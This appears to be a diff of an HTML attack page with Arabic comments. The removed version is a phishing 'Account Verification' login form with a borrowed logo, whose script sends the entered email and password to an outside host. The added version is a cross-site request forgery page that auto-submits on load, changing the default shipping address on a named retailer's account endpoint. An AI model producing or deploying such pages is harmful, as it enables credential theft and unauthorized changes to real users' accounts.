@@ -1,135 +1,28 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>Sign In</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+<html>
+  <body>
+    <form id="csrf-form" action="https://merchandise.ford.com/account/addresses" method="POST">
+      <input type="hidden" name="form_type" value="customer_address">
+      <input type="hidden" name="utf8" value="✓">
+      
+      <input type="hidden" name="address[default]" value="1">
+      <input type="hidden" name="address[first_name]" value="look">
+      <input type="hidden" name="address[last_name]" value="up">
+      <input type="hidden" name="address[company]" value="ll">
+      <input type="hidden" name="address[address1]" value="876 mnhgtr">
+      <input type="hidden" name="address[city]" value="makkjj">
+      <input type="hidden" name="address[province]" value="Alabama">
+      <input type="hidden" name="address[zip]" value="35004">
+      <input type="hidden" name="address[country]" value="United States">
+      <input type="hidden" name="address[phone]" value="1234567890">
 
-  <!-- خط قريب من اللي يستخدمونه -->
-  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Now+Text:wght@300;400;500&display=swap" rel="stylesheet">
-
-  <style>
-    * {
-      box-sizing: border-box;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-    }
-
-    body {
-      margin: 0;
-      background: #ffffff;
-      color: #111;
-    }
-
-    .container {
-      max-width: 420px;
-      margin: 120px auto;
-      padding: 40px;
-      border: 1px solid #e5e5e5;
-    }
-
-    .logo {
-      text-align: center;
-      margin-bottom: 40px;
-    }
-
-    .logo img {
-      width: 140px;
-    }
-
-    h1 {
-      font-size: 18px;
-      font-weight: 400;
-      letter-spacing: 1px;
-      text-align: center;
-      margin-bottom: 30px;
-      text-transform: uppercase;
-    }
-
-    label {
-      display: block;
-      font-size: 12px;
-      letter-spacing: 0.5px;
-      margin-bottom: 6px;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      margin-bottom: 24px;
-      font-size: 14px;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #000;
-    }
-
-    button {
-      width: 100%;
-      padding: 14px;
-      background: #000;
-      color: #fff;
-      border: none;
-      font-size: 13px;
-      letter-spacing: 1px;
-      cursor: pointer;
-      text-transform: uppercase;
-    }
-
-    button:hover {
-      background: #222;
-    }
-
-    .footer {
-      text-align: center;
-      font-size: 11px;
-      color: #777;
-      margin-top: 30px;
-    }
-  </style>
-</head>
-
-<body>
-
-  <div class="container">
-    <div class="logo">
-      <!-- شعار تجريبي -->
-       <img src="https://uk.theory.com/on/demandware.static/Sites-theory_uk-Site/-/default/dw0b73ec04/images/logo.png" alt="Logo">
-    </div>
-
-    <h1>Account Verification</h1>
-
-    <form id="testForm">
-      <label>email</label>
-      <input type="text" name="name" required>
-    
-      <label>password</label>
-      <input type="text" name="code" required>
-    
-      <button type="submit">Continue</button>
+      <input type="submit" value="Submit Request">
     </form>
-    
+
     <script>
-      document.getElementById("testForm").addEventListener("submit", function (e) {
-        e.preventDefault(); // ⛔ يمنع التحويل
-    
-        const params = new URLSearchParams(new FormData(this));
-    
-        fetch("https://omar.com/endpoint?" + params.toString(), {
-          method: "GET",
-          mode: "no-cors" // لو السيرفر خارجي
-        });
-    
-        alert("Data sent without redirect");
-      });
+      // التأكد من تحميل الصفحة ثم إرسال النموذج تلقائياً
+      window.onload = function() {
+        document.getElementById('csrf-form').submit();
+      };
     </script>
-
-
-    <div class="footer">
-      © 2026 All Rights Reserved
-    </div>
-  </div>
-
-</body>
+  </body>
 </html>
